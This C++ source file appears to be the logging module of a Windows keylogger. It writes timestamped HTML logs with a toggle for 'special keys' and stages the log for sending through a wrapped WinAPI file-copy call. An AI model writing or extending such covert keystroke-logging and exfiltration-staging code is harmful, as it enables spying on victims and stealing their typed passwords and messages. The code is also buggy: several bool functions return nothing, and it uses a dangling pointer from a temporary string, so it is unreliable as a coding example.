#include "Log.h"

Log::Log() {
    //constructor
    this->firstRun = false;
    this->time = new TimeLog();
    this->config = new Config();
    this->newWinApix = new newWinApi();
}

bool Log::createNewLog(string fileName) {
    if (!this->fileExist(fileName.c_str())) {
        FILE *file = fopen(fileName.c_str(), "w");
        fputs("<html><head> <script type=\"text/javascript\">function toggle(){ var elements = document.getElementsByClassName('sK'); for (var i = 0; i < elements.length; i++){ if (elements[i].style.display == \"none\") elements[i].style.display = \"inline\"; else elements[i].style.display=\"none\";}}</script>    <meta charset=\"utf-8\"><style>body {background-color: #f6f6f6;font-family: Tahoma, Verdana, Segoe, sans-serif; word-wrap: break-word;} span { color: silver; display: inline; } h1 {text-align: center;} .wszystkieLogi {width: 800px;margin-left: auto ;margin-right: auto ;} .pojedynczyLog {margin-top: 10px;} .tekstLog {padding: 5px 10px 0px 10px;} .naglowekLogu {font-weight: bold; background-color: #d3d3d3;padding: 2px 5px 2px 5px;}</style></head><body><div class=\"wszystkieLogi\">", file);
        fputs("<a href=\"javascript:toggle();\">Ukryj klawisze specjalne</a><h1>", file);
        fputs(this->time->getNowTime().c_str(), file);
        fputs("</h1>", file);
        fputs("</h1><div><div>", file);
        fclose(file);
        return true;
    } else {
        //file exist!
        return false;
    }

}

bool Log::addNewLog(string fileName, string title, string character) {
    if (!this->fileExist(fileName.c_str())) {
        this->createNewLog(fileName);
    }

    FILE *file = fopen(fileName.c_str(), "a+");
    fputs("</div></div><div class=\"pojedynczyLog\"><div class=\"naglowekLogu\">", file);
    fputs(this->time->getNowTime().c_str(), file);
    fputs(" | ", file);
    fputs(title.c_str(), file);
    fputs("</div><div class=\"tekstLog\">", file);
    fputs(character.c_str(), file);
    fclose(file);
}

bool Log::addLog(string fileName, string character) {
    if (!this->fileExist(fileName.c_str())) {
        this->createNewLog(fileName);
    }
    FILE *file = fopen(fileName.c_str(), "a+");
    fputs(character.c_str(), file);
    fclose(file);
}

bool Log::fileExist(string fileName) {
    if (FILE * file = fopen(fileName.c_str(), "r")) {
        fclose(file);
        return true;
    } else {
        //file not exists 
        return false;
    }
}

void Log::prepareSendLog() {
    LPCSTR logFileName;
    logFileName = this->config->GetLogFileName().c_str();
    newWinApix->KopiujPlik()(logFileName, "tmp.txt", true);
    remove(logFileName);
    this->createNewLog(logFileName);

    FILE *plik = fopen("tmp.html", "w");

    ifstream input("tmp.txt");
    std::string line;
    while (std::getline(input, line)) {
        fputs(line.c_str(), plik);
    }
    fputs("</div></body></head>", plik);
    fclose(plik);
    input.close();
    remove("tmp.txt");
}
